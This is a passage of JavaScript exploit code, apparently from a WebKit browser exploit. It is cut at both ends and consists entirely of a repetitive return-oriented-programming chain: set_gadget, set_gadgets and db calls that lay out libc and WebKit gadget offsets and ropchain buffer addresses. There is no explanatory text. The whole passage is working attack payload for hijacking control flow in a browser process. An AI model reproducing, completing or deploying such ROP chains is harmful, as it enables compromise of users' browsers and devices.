webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+114904, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+114920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+115064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+115032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+115048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+115136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+115192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+115272, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([27, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+115376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+115392, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+115480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+115536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+115608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+115664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+115768, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+115856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+115872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+116016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+115984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+116000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+116088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+116144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+116224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([3, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+116328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+116344, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+116432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+116488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+116608, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+116696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+116712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+116856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+116824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+116840, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+116928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+116984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+117064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([28, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+117168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+117184, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+117272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+117328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+117400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+117456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+1026352, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+117608, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+117696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+117712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+117856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+117824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+117840, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+117928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+117984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+118064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([29, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+118168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+118184, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+118272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+118328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+118400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+118456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+118608, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+118696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+118712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+118856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+118824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+118840, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+118928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+118984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+119064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([30, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+119168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+119184, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+119272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+119328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+119400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+119456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+119560, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+119648, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+119664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+119808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+119776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+119792, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+119880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+119936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+120016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([7, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+120120, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+120136, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+120224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+120280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+120400, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+120488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+120504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+120648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+120616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+120632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+120720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+120776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+120856, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([31, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+120960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+120976, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+121064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+121120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+121192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+121248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+788575, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+121400, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+121488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+121504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+121648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+121616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+121632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+121720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+121776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+121856, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+121960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+121976, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+122064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+122120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+122192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+122248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+122352, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+122440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+122456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+122600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+122568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+122584, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+122672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+122728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+122808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([37, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+122912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+122928, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+123016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+123072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+123192, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+123280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+123296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+123440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+123408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+123424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+123512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+123568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+123648, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([33, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+123752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+123768, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+123856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+123912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+123984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+124040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+471355, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+124192, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+124280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+124296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+124440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+124408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+124424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+124512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+124568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+124648, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
